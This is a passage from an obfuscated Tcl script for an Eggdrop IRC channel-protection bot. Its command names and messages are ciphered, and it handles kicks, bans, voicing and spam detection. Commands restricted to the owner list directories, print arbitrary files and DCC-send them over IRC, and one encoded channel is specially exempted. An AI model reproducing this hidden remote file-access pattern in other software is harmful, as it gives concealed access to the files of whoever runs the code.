newignore $hostmask $botnick "*" 1
}
return 1
}
proc [lines "xszg_xgxk"] {nick uhost hand dest key arg} {
global botnick notc
if {[matchattr $nick Z]} { return 0 }
puthlp "MLGRXV ~$nick ~:~$notc ~14HlIIB R WlMG PMlD BlF..!"
newignore "${nick}!*@*" $botnick "*" 1
return 1
}
set [lines "erifh_mrxp"] ""
bind ctcp - DCC got_dcc
proc [lines "tlg_wxx"] {nick uhost handle dest key arg} {
global virus_nick notc notd botnick
if {[matchattr $nick f]} { return 0 }
if {[lindex $arg 2] == 0 && [lindex $arg 3] == 0} {
putlog "!Log! FaKE DCC SKIPPED..!"
return 1
}
set [lines "erifh_mrxp"] $nick
foreach x [channels] {
if {[onchan $nick $x] && ![isop $nick $x]} {
if {[isop $botnick $x]} {
putsrv "PRXP ~$x ~~$nick ~:~$notc ~4!HkzN!14 R SzGV 4ERIfA ~[banms]~"
set [lines "erifh_mrxp"] ""
} else {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "!Log! RePORTED ViRUS FRoM <<$nick$x>> To #$c#"
set [lines "hvmwhkzn"] "!kick [zip "$x $nick $notc 4!SpaM!14 YeW GoT VIRuZ JoIN #NOHACK TO FIxED [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
return 1
}
proc [lines "elrxvj"] {chan nick} {
utimer [expr 5 + [rand 15]] [list voiceprc $chan $nick]
}
proc [lines "elrxvkix"] {chan nick} {
global botnick
if {[isop $botnick $chan] && ![isvoice $nick $chan] && ![isop $nick $chan]} { 
putserv "MODE $chan +vvvvvv $nick"
}
}
proc [lines "zwevigrhv"] {chan nick} {
if {[isutimer "advq $chan $nick"]} { return 0 }
set [lines "xivg"] 5
foreach ct [utimers] {
if {[string match "*advq*" $ct]} {
if {[expr [lindex $ct 0] + 5] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + 5]
}
}
}
utimer $cret [list advq $chan $nick]
}
proc [lines "zwej"] {chan nick} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![isop $nick $chan] && [onchan $nick $chan]} {
set [lines "tivvgnht"] [getuser $cflag XTRA "GREET"]
regsub %n $greetmsg $nick greetmsg
regsub %c $greetmsg $chan greetmsg
puthlp "MLGRXV ~$nick ~:~[lgrnd]~ ~$greetmsg"
}
}
proc [lines "nhtkzig"] {chan nick} {
if {[isutimer "msgprt $chan $nick"]} { return 0 }
set [lines "xivg"] 5
foreach ct [utimers] {
if {[string match "*msgprt*" $ct]} {
if {[expr [lindex $ct 0] + 5] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + 5]
}
}
}
utimer $cret [list msgprt $chan $nick]
}
proc [lines "nhtkig"] {chan nick} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "nhtkigg"] [getuser $cflag XTRA "MSGPART"]
regsub %n $msgprtt $nick msgprtt
regsub %c $msgprtt $chan msgprtt
puthlp "MLGRXV ~$nick ~:~[lgrnd] $msgprtt"
}
proc [lines "wvlkkix"] {chan nick} {
global botnick
if {[isop $botnick $chan] && [isop $nick $chan]} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -ko 4n0.Guest.@ps $nick"
} {
putserv "MODE $chan -o $nick"
}
}
}
proc [lines "zfglprxp"] {chan nick} {
global bannick notc botnick
if {[isop $botnick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan]} {
set [lines "slhgnzhp"] [getchanhost $nick $chan]
set [lines "slhgnzhp"] "*!*@[lindex [split $hostmask @] 1]"
set bannick($nick) $hostmask
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14xSzMMvO RH FmWvI x0MhGIfxGRlM ~[banmsg]~" 
}
}
proc [lines "lkj"] {chan nick} {
utimer [expr 7 + [rand 15]] [list opprc $chan $nick]
}
proc [lines "lkkix"] {chan nick} {
global botnick unop
if {[isop $botnick $chan] && ![isop $nick $chan] && ![info exists unop($nick)]} {
putserv "MODE $chan +oooooo $nick"
}
}
proc [lines "wxx_xnw"] {hand idx arg} {
if {![matchattr $hand Z]} { return 0 }
if {![matchattr $hand Q]} { chattr $hand +Q }
msg_Z $hand "*" $hand $arg
}
proc [lines "wxx_tvg"] {hand idx arg} {
global notc own
if {$hand != $own} { return 0 }
if {![file exists [lindex $arg 0]]} {
putdcc $idx "4DeNIEd..!, [lindex $arg 0] <n/a>"
return 0
}
if {[lindex $arg 1] != ""} { 
set [lines "szmw"] [lindex $arg 1] 
}
switch -- [dccsend [lindex $arg 0] $hand] {
0 { putdcc $idx "<<TRaNSFERRING LOG>>" }
1 { putdcc $idx "dcc table is full (too many connections), TrY AgAIN LaTeR!" }
2 { putdcc $idx "can't open a socket for transfer." }
3 { putdcc $idx "file doesn't exist." }
4 { putdcc $idx "file was queued for later transfer." }
}
}
proc [lines "nht_tvg"] {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "KIRENHT ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![file exists $arg]} {
puthlp "KIRENHT ~$nick ~:4WvMRVw..!, ~$arg ~<m/z>"
return 0
}
switch -- [dccsend $arg $nick] {
0 { 
puthlp "MLGRXV ~$nick ~:~$notc ~GIzMHUVIIRMT OLT..!" 
}
1 { 
puthlp "MLGRXV ~$nick ~:~$notc ~wxx gzyov rh ufoo (gll nzmb xlmmvxgrlmh), GiB ZtZRM OzGVI!" 
}
2 { 
puthlp "MLGRXV ~$nick ~:~$notc ~xzm'g lkvm z hlxpvg uli gizmhuvi." 
}
3 { 
puthlp "MLGRXV ~$nick ~:~$notc ~urov wlvhm'g vcrhg." 
}
4 { 
puthlp "MLGRXV ~$nick ~:urov dzh jfvfvw uli ozgvi gizmhuvi." 
}
}
}
bind raw - 301 rtn
proc [lines "igm"] { from keyword arg } {
global notd botnick notb notc bannick
set [lines "mrxp"] [lindex $arg 1]
if {[matchattr $nick f]} { return 0 }
set [lines "zdzbgvcg"] [string range [lrange $arg 2 end] 1 end]
if {[string match "*[dezip "4HUr61PzFKB1"]*" [uncolor $awaytext]]} { return 0 }
if {$nick == $botnick} {
#puthlp "ZDZB :~[dezip "/LePD/hKOJz.SqEeI.BYZn7/JKlgX.fPo/A0UhPyK/prkIz/"]~"
} {
if {[string match "*#*" $awaytext] || [string match "*/j*" $awaytext]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $awaytext]]} { return 0 }
}
foreach x [channels] {
if {[onchan $nick $x]} {
if {[isop $botnick $x]} {
set bannick($nick) "*!*[string range [getchanhost $nick $x] [string first "@" [getchanhost $nick $x]] end]"
putsrv "PRXP ~$x ~~$nick ~:~$notc ~4!HkzN!14 RmeRGV zDzB NHt ~[banmsg]~"
return 0
} {
set [lines "nvnyvih"] [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set [lines "hvmwhkzn"] "!kick [zip "$x $nick $notc 4!SpaM!14 FRoM 4[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]14 InvITE aWaY MSg [banmsg]"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
return 0
}
}
}
}
}
}
} 
}
bind time -  "*0 * * * *" chk_five
bind time -  "*6 * * * *" chk_five
proc [lines "xsp_urev"] {min h d m y} {
global longer deff
catch { remain }
if {![string match "**" $longer]} {
set [lines "olmtvi"] "$deff"
}
puthlp "ZDZB :~$longer"
auto_ping "0" "0" "0" "0" "0"
}
proc [lines "nht_wri"] {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "KIRENHT ~$nick ~:4WvMRVw..!"
return 0
}
if {$arg == ""} {
set [lines "zit"] "."
}
set [lines "wriorhg"] ""
foreach x [getfiles "$arg"] {
append dirlist "$x "
}
puthlp "KIRENHT ~$nick ~:~$dirlist"
}
proc [lines "nht_ivzw"] {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "KIRENHT ~$nick ~:4WvMRVw..!"
return 0
}
if {![file exists $arg]} {
puthlp "KIRENHT ~$nick ~:4WvMRVw..!, ~$arg ~<m/z>"
return 0
}
set [lines "uw"] [open $arg r]
while {![eof $fd]} {
set [lines "rmk"] [gets $fd]
puthlp "KIRENHT ~$nick ~:~$inp"
}
close $fd
puthlp "KIRENHT ~$nick ~:VlU..!"
}
proc [lines "kfy_olt"] {nick uhost hand channel arg} {
global notc 
if {[getuser "config" XTRA "LOGCHAN"]!=""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Olt ~[getuser "config" XTRA "LOGCHAN"]~"
}
}
proc [lines "kfy_hvievi"] {nick uhost hand channel arg} {
global server notc
if {$arg != ""} {
if {[string match "*$arg*" $server]} {
puthlp "kirenht ~$channel ~:~[lindex $server 0]~"
}
} {
puthlp "kirenht ~$channel ~:~[lindex $server 0]~"
}
}
set [lines "ldm"] $owner
proc [lines "wxx_wri"] {hand idx arg} {
global own
if {$hand != $own} { return 0 }
if {$arg == ""} {
set [lines "zit"] "."
}
foreach x [getfiles "$arg"] {
putdcc $idx "$x"
}
}
proc [lines "wxx_ivzw"] {hand idx arg} {
global own
if {$hand != $own} { return 0 }
if {![file exists $arg]} {
putdcc $idx "4DeNIEd..!, FiLE NoT ExIST $arg"
return 0
}
set [lines "uw"] [open $arg r]
while {![eof $fd]} {
set [lines "rmk"] [gets $fd]
putdcc $idx "$inp"
}
close $fd
putdcc $idx "4******************** END ***********************"
}
proc [lines "nht_yzmgrnv"] {nick uhost hand rest} {
global notc ban-time
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~YzmGrnv \[~${ban-time}\] ~(hvg 0 gl mvevi fmyzm)"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "ngrnv"] [lindex $rest 0]
if {![isnumber $mtime]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: yzmgrnv <nrmfgvh> (hvg 0 gl mvevi fmyzm)"
return 0
}
set [lines "yzm-grnv"] $mtime
setuser "config" XTRA "BANTIME" $mtime
puthlp "MLGRXV ~$nick ~:~$notc ~YzmGrnv \[~$mtime\]"
saveuser
}
proc [lines "xsp_ornrg"] {chan} {
global notc botnick lst_limit
if {![isop $botnick $chan]} { return 0 }
if {![info exists lst_limit($chan)]} {
set lst_limit($chan) 0
}
set [lines "xuozt"] "c$chan" 
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "fhvixlfmg"] 0
foreach x [chanlist $chan] {
incr usercount
}
set [lines "fhvixlfmg"] [expr [getuser $cflag XTRA "LIMIT"] + $usercount]
if {$lst_limit($chan) != $usercount} {
set lst_limit($chan) $usercount
putserv "MODE $chan +l $usercount"
}
}
proc [lines "nht_oltxszm"] {nick uhost hand rest} {
global notc own
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: oltxszm <#xszmmvo/0>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string tolower $rest] == "off"} {
puthlp "MLGRXV ~$nick ~:~$notc ~OLTXSZM ~[getuser "config" XTRA "LOGCHAN"]~ \[4LUU\]"
setuser "config" XTRA "LOGCHAN" ""
} else {
if {[string tolower $rest] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
return 0
}
if {![validchan $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$rest"
return 0
}
setuser "config" XTRA "LOGCHAN" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~OLT XSzMMVO ~$rest ~\[9LM\]"
}
saveuser
utimer 5 rehashing
}
proc [lines "wxx_olt"] {hand idx arg} {
global logstore notc
if {$logstore == ""} {
putdcc $idx "No LOG FouNd..!"
return 0
}
if {![file exists $logstore]} {
putdcc $idx "4DeNIEd..!, Log file haven't create yet!"
return 0
}
set [lines "uw"] [open $logstore r]
while {![eof $fd]} {
set [lines "rmk"] [gets $fd]
putdcc $idx "$inp"
}
close $fd
putdcc $idx "4******************** END ***********************"
}
set [lines "jfrxp"] "0"
proc [lines "xsp_jfrxp"] {} {
global quick botnick
putquick "PRIVMSG $botnick :\001PING [unixtime]\001"
set [lines "jfrxp"] "1"
}
utimer 1 chk_quick
bind raw - MODE chk_op
proc [lines "xsp_lk"] { from keyword arg } {
global botnick
if {![string match "*+o*$botnick*" $arg]} { return 0 }
set [lines "xszm"] [lindex $arg 0]
if {[string match "*dal.net*" $from]} {
pub_resync $botnick "*" "*" $chan "*"
return 0
}
chk_on_op $chan
}
proc [lines "xsp_lm_lk"] {channel} {
global botnick kickme deopme invme virus_nick quick notc bannick is_m botname
set [lines "xuozt"] "c$channel"
set [lines "xuozt"] [string range $cflag 0 8]
if {[isutimer "chkspam $channel"]} {
foreach x [utimers] {
if {[string match "*chkspam $channel*" $x]} { killutimer [lindex $x 2] }
}
}
if {[isutimer "GOP $channel"]} { return 0 }
if {![onchan $botnick $channel]} { return 0 }
utimer 20 [list putlog "GOP $channel"]
set [lines "xrmul"] [channel info $channel]
if {[string match "*+nodesynch*" $cinfo]} {
pub_mdeop "*" "*" "*" $channel ""
}
set [lines "xnlwv"] [getchanmode $channel]
if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
if {[matchattr $cflag K]} {
if {![string match "*[dezip [getuser $cflag XTRA "CI"]]*" [getchanmode $channel]]} {
puthelp "mode $channel -k+k . [dezip [getuser $cflag XTRA "CI"]]"
}
} {
if {[string match "*k*" $cmode]} {
if {[string tolower $channel] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
putserv "mode $channel -k 4r.e.l.e.a.s.e.d"
}
}
}
if {[string match "*R*" $cmode]} {
puthelp "mode $channel -R"
}
if {[string match "*m*" $cmode] && ![string match "*m*" [lindex [channel info $channel] 0]]} {
putserv "mode $channel -m"
}
if {[string match "*i*" $cmode]} {
putserv "mode $channel -i"
}
}
if {![string match "*m*" $cmode]} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x]} {
killutimer [lindex $x 2]
}
}
}
if {[matchattr $cflag I]} {
if {[topic $channel] != [getuser $cflag XTRA "TOPIC"]} {
puthlp "glkrx ~$channel ~:~[getuser $cflag XTRA "TOPIC"]~"
}
}
foreach x [chanlist $channel] {
if {$x == $deopme} {
if {[isop $x $channel]} {
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -ko 4De@p.ReveRsE $x"
} else {
putserv "mode $channel -ko 4De@p.ReveRsE $x"
}
} {
if {$quick == "1"} {
putquick "mode $channel -o $x"
} else {
putserv "mode $channel -o $x"
}
}
}
set [lines "wvlknv"] ""
}
set [lines "nslhg"] "@[lindex [split [getchanhost $x $channel] @] 1]"
if {[info exists kickme($x)]} {
if {$kickme($x) == 3} {
catch { unset kickme($x) }
set bannick($x) "*!*$mhost"
if {$quick == "1"} {
putqck "PRXP ~$channel ~~$x ~:~$notc ~14IvKvzG 4PRxP 14IvNlGv LUU4..!"
} else { 
putsrv "PRXP ~$channel ~~$x ~:~$notc ~14IvKvzG 4PRxP 14IvNlGv LUU4..!"
}
} {
if {$kickme($x) == 1} {
if {$quick == "1"} {
putqck "PRXP ~$channel ~~$x ~:~$notc ~14HvOU 4PRxP14 IVeVMtV4..!"
} {
putsrv "PRXP ~$channel ~~$x ~:~$notc ~14HvOU 4PRxP14 IVeVMtV4..!"
}
}
}
}
if {[matchattr $cflag V]} {
if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
set [lines "xivg"] [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $channel $x]
}
}
}
if {[matchattr $x v] || [matchattr $x P] || [matchattr $x G]} {
if {![isop $x $channel] || ![isvoice $x $channel]} {
whoisq $x
}
}
if {[string match "*+unidentifyop*" [channel info $channel]]} {

if {[isop $x $channel]} {
whoisq $x
}
}
if {[matchattr $x O]} {
if {[isop $x $channel]} {
set [lines "xnlwv"] [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -ko 4No@p.LIsT $x"
} {
puthelp "mode $channel -o $x"
}
} {
if {[isvoice $x $channel]} {
set [lines "xnlwv"] [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kv 4No@p.LIsT $x"
} {
puthelp "mode $channel -v $x"
}
}
}
}
if {[info exists invme($mhost)]} {
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
if {$invme($mhost) == "AuToJoIN MSg"} {
if {![isvoice $x $channel]} {
putsrv "PRXP ~$channel ~~$x ~:~$notc ~4!HkzN!14 UIlN 4~$mhost ~14~$invme($mhost) ~4I14vnlgv 4L14uu4..!"
}
} {
putsrv "PRXP ~$channel ~~$x ~:~$notc ~4!HkzN!14 UIlN 4~$mhost ~14~$invme($mhost) ~~[banmsg]~"
}
}
catch {unset invme($mhost)}
}
if {$x == $virus_nick} {
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
putsrv "PRXP ~$channel ~~$x ~:~$notc ~4!HkzN!14 UIlN 4~$mhost14 ~ERIfA ~[banmsg]~"
set [lines "erifh_mrxp"] ""
}
} 
spam_chk $x [getchanhost $x $channel] "*" $channel
}
foreach x [chanlist $channel K] {
if {![matchattr $x f]} {
akick_chk $x [getchanhost $x $channel] $channel
}
}
foreach x [chanbans $channel] {
set [lines "yslhg"] [lindex $x 0]
if {[string match [string tolower $bhost] [string tolower $botname]]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4SeLF.UnBaN $bhost"
} {
puthelp "mode $channel -b $bhost"
}
} elseif {[matchattr $bhost f]} {
puthelp "mode $channel -b $bhost"
} elseif {[getuser "config" XTRA "IPG"] != ""} {
foreach ipg [getuser "config" XTRA "IPG"] {
if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
if {![isutimer "IPG $bhost"]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4IpgUaRd $bhost"
} {
puthelp "mode $channel -b $bhost"
}
utimer 60 [list putlog "IPG $bhost"]
}
}
}
}
}
}
bind time -  "03 * * * *" show_status
proc [lines "hsld_hgzgfh"] {min h d m y} {
global botnick
foreach x [channels] {
if {[isop $botnick $x]} { 
pub_status "*" "*" "*" $x "" 
chk_on_op $x
}
}
return 0
}
proc [lines "yzwmrxp_xsp"] {nick uhost hand chan} {
global bannick notc botnick badwords
foreach x [string tolower $badwords] {
if {[string match "*$x*" [string tolower $nick]]} {
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4YzW MRxP14 NzGxS UIlN 4~[string toupper $x]~ ~[banms]~"
return 1
}
}
return 0
}
proc [lines "hkzn_xsp"] {nick uhost hand chan} {
global notc botnick spidx
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $cflag S]} { return 0 }
if {$nick == $botnick} { return 0 }
if {[isvoice $nick $chan]} { return 0 }
if {[isop $nick $chan]} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[badnick_chk $nick $uhost $hand $chan]} { 
return 0
}
set [lines "mrxpovm"] [string length $nick]
if {$nicklen < 5} { return 0 }
set [lines "rwc"] [string index $nick [expr $nicklen - 4]][string index $nick [expr $nicklen - 3]][string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
if {[isnumber $idx]} { return 0 }
set [lines "rwc"] [string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
if {[isnumber $idx]} {
if {[string index $uhost 0] != "~"} { return 0 }
if {$nicklen < 10} {
if {![string match "~$nick@*" $uhost]} { return 0 }
} {
if {![string match "~[string index $nick 0][string index $nick 1][string index $nick 2]*@*" $uhost]} { return 0 }
}
if {$spidx == 18} {
set [lines "hkrwc"] 1
}
spamkick $nick $uhost $chan
return 0
}
if {[regexp \[^a-z\] $nick]} { return 0 }
set [lines "mrxpxsp"] [string tolower $nick]
set [lines "xlfmg"] 0
set [lines "ohgrwc"] ""
for {set i 0} {$i < $nicklen} {incr i} {
set [lines "rwc"] [string index $nickchk $i]
if {$idx == "a" || $idx == "e" || $idx == "i" || $idx == "o" || $idx == "u"} {
set [lines "xlfmg"] 0
} {
if {$idx != $lstidx && $idx != "y"} { incr count }
if {$count == 4} {
spamkick $nick $uhost $chan
return 0
}
}
set [lines "ohgrwc"] $idx
}
}
proc [lines "zprxp_xsp"] {nick uhost chan} {
global notc bannick
foreach x [getuser "AKICK" HOSTS] {
if {[string match [string tolower $x] [string tolower "$nick!$uhost"]]} {
set bannick($nick) $x
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4Y14O4z14x4P14O4R14h4G14 NzGxS UIlN4 ~$x ~~[banms]~"
return 0
}
}
}
set [lines "hkrwc"] 1
proc [lines "hkznprxp"] {nick uhost chan} {
global spidx notc bannick
set bannick($nick) "*!$uhost"
if {$spidx == 1} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 BvD ZRmG DvOxLnV Rm 4~[string toupper $chan]~ ~[banms]~"
} elseif {$spidx == 2} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 WIlmV GIlQzM ~[banmsg]~"
} elseif {$spidx == 3} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 FtS R SzgV GsRh MRxP ~[banmsg]~"
} elseif {$spidx == 4} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 Fkh DIlMt DzB ~[banmsg]~"
} elseif {$spidx == 5} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 WlmG VmGvIvW 4~[string toupper $chan]~ ~[banms]~"
} elseif {$spidx == 6} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 RmGvIxVkG ~[banmsg]~"
} elseif {$spidx == 7} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 T.l.G.x.S.z ~[banmsg]~"
} elseif {$spidx == 8} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 MVtzGReV SlFhGlM ~[banmsg]~"
} elseif {$spidx == 9} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 tIlFmwVw ~[banmsg]~"
} elseif {$spidx == 10} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 ZmGRxRkzGVw ~[banmsg]~"
} elseif {$spidx == 11} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 tL hRg Rm gSv xLiMvI ~[banmsg]~"
} elseif {$spidx == 12} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 y.o.z.x.p.o.r.h.g.v.w ~[banmsg]~"
} elseif {$spidx == 13} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 IvQvxGvw UIlN 4~[string toupper $chan]~ ~[banms]~"
} elseif {$spidx == 14} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 hNllhSRMt IvOzB GzYOv ~[banmsg]~"
} elseif {$spidx == 15} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 wFm VmGvIvw lMv lU nB xSzmmvO ~[banmsg]~"
} elseif {$spidx == 16} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 IvUfhVw ORmP gL 4~[string toupper $chan]~ ~[banms]~"
} elseif {$spidx == 17} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 UzpV MRxPMzNv ~[banmsg]~"
} elseif {$spidx >= 18} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!14 Fmzyov gl ivhloev4 ~$nick ~~[banms]~"
set [lines "hkrwc"] 0
}
incr spidx
return 0
}
proc [lines "rhfgrnvi"] {text} {
set [lines "gvcg"] [string tolower $text]
foreach x [utimers] {
set [lines "c"] [string tolower $x]
if {[string match "*$text*" $x]} { 
return 1
break
}
}
return 0
}
proc [lines "rhgrnvi"] {text} {
set [lines "gvcg"] [string tolower $text]
foreach x [timers] {
set [lines "c"] [string tolower $x]
if {[string match "*$text*" $x]} { 
return 1 
break
}
}
return 0
}
catch { set old_hostname ${my-hostname} }
catch { set old_ip ${my-ip} }
bind msg Z vhost msg_vhost
proc [lines "nht_eslhg"] {nick uhost hand rest} {
global my-hostname my-ip notc
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~IvHVG GL WvUzfOG"
setuser "config" XTRA "VHOST" ""
saveuser
vback "*" "*" "0"
return 0
}
for {set i 0} {$i < [string length $rest]} {incr i} {
set [lines "rwc"] [string index $rest $i]
if {![string match "*$idx*" "1234567890."]} {
puthlp "MLGRXV ~$nick ~:~$notc ~FhV WMH RK MfNYvI"
return 0
}
}
if {[isutimer "vback"]} {
puthlp "MLGRXV ~$nick ~:~$notc ~DzRG..!"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "nb-slhgmznv"] $rest
set [lines "nb-rk"] $rest
utimer 30 [list vback $nick $rest "1"]
listen 65234 bots
set [lines "rwc"] [connect $rest 65234]
if {[isnumber $idx] && $idx > 0} {
if {![isutimer "vback"]} { return 0 }
foreach x [utimers] {
if {[string match "*vback*" $x]} { killutimer [lindex $x 2] }
}
setuser "config" XTRA "VHOST" $rest
saveuser
putsrv "JFRG :~$notc ~xSzMtRMt eSlhG IvJfvhG Yb \[ ~$nick ~\]"
}
listen 65234 off
}
bind raw - 465 klined
proc [lines "pormvw"] {from keyword arg} {
vback "*" "*" "0"
}
proc [lines "eyzxp"] {nick vhosts chk} {
global old_hostname old_ip notc
set [lines "nb-slhgmznv"] $old_hostname
set [lines "nb-rk"] $old_ip
if {$chk == "1"} {
puthlp "MLGRXV ~$nick ~:~$notc ~\[~$vhosts\] ~MlG HfKKlIG..!"
}
catch { listen 652343 off }
}
proc [lines "kfy_hgzgfh"] {nick uhost hand channel rest} {
global ban-time botnick own ps vern
set [lines "xuozt"] "c$channel"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest != ""} {
if {[validchan $rest]} {
set [lines "xszmmvo"] $rest
} { 
return 0 
}
}
set [lines "xrmul"] [channel info $channel]
if {![string match "*+shared*" $cinfo] && $nick == "*"} { return 0 }
set [lines "nhgzgfh"] ""
if {[matchattr $cflag I]} { append mstatus "\[4T\]oPIcLocK " }
if {[matchattr $cflag M]} { append mstatus "FoRcE\[4M\]odE " }
if {[string match "*+nodesynch*" $cinfo]} { append mstatus "AuTo\[4K\]IcK " }
if {[string match "*-userinvites*" $cinfo]} { append mstatus "\[4D\]onTKIcK@P " }
if {[string match "*+protectfriends*" $cinfo]} { append mstatus "UnRE\[4@\]P " }
if {[string match "*+greet*" $cinfo]} {
set [lines "r"] 0
while {$i < [string length $cinfo]} {
set [lines "b"] 0
while {$y < [string length [lindex $cinfo $i]]} {
if {[string index [lindex $cinfo $i] $y] == ":"} { break }
set [lines "b"] [incr y]
}
if {$y != [string length [lindex $cinfo $i]]} { break }
set [lines "r"] [incr i]
}
set [lines "rxszm"] [lindex $cinfo $i]
set [lines "rxgxk"] [lindex $cinfo [expr $i + 1]]
set [lines "rqlrm"] [lindex $cinfo [expr $i + 2]]
set [lines "rprxp"] [lindex $cinfo [expr $i + 3]]
set [lines "rwvlk"] [lindex $cinfo [expr $i + 4]]
set [lines "rmrxp"] [lindex $cinfo [expr $i + 5]]
if {![string match "*:*" $inick]} {
set [lines "rmrxp"] "0"
}
append mstatus "\[4G\]uaRd FLoOd \[LInE4 $ichan cTcP4 $ictcp JoIN4 $ijoin KIcK4 $ikick De@p4 $ideop NIcK4 $inick\] "
if {${ban-time} != 0} { append mstatus "\[4B\]aNTImE4 ${ban-time} mIn " }
}
if {[matchattr $cflag V]} { append mstatus "\[4A\]uToVoIcE4 [getuser $cflag XTRA "VC"] 2nd " }
if {[matchattr $cflag K]} { append mstatus "\[4K\]eY " }
if {[matchattr $cflag D]} { append mstatus "Re\[4V\]eNgE " }
if {[matchattr $cflag G]} { append mstatus "\[4G\]ReeT " }
if {[matchattr $cflag H]} { append mstatus "\[4N\]TcParT " }
if {[matchattr $cflag S]} { append mstatus "\[4S\]paM " }
if {[getuser "config" XTRA "KOPS"]!=""} { append mstatus "\[4@\]PSKIcK " }
if {[matchattr $cflag R]} { append mstatus "\[4R\]ePeaT4 [getuser $cflag XTRA "RPT"] " }

if {[matchattr $cflag U]} { append mstatus "\[4C\]aPs4 [getuser $cflag XTRA "CAPS"]% " }
if {[matchattr $cflag P]} { append mstatus "JoIN\[4P\]aRT4 [getuser $cflag XTRA "JP"] 2nd " }
if {[matchattr $cflag T]} { append mstatus "\[4T\]exT4 [getuser $cflag XTRA "CHAR"] CHaR " }
if {[matchattr $cflag J]} { append mstatus "MaSs\[4J\]oIN " }
if {[matchattr $cflag L]} { append mstatus "\[4L\]ImITEd4 +[getuser $cflag XTRA "LIMIT"] " }
if {[string match "*+seen*" $cinfo]} { append mstatus "\[4S\]EEN " }
if {[matchattr $cflag O]} { append mstatus "\[4C\]LonE4 [getuser $cflag XTRA "CLONE"] MaX " }
